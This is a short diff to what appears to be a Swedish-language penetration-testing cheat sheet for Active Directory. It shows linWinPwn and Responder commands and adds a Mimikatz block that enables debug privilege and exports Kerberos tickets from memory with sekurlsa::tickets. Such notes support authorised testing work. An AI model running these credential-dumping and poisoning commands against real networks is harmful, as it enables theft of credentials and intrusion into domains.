@@ -21,3 +21,11 @@ sudo ./linWinPwn.sh -t <Domän_Kontrollant_IP> -u <AD_konto> -p <AD_lösen>
 ```bash
 responder -I eth0 -v
 ```
+
+## Mimikatz
+```bash
+mimikatz.exe
+privilege::debug
+privilege::debug
+sekurlsa::tickets /export
+```
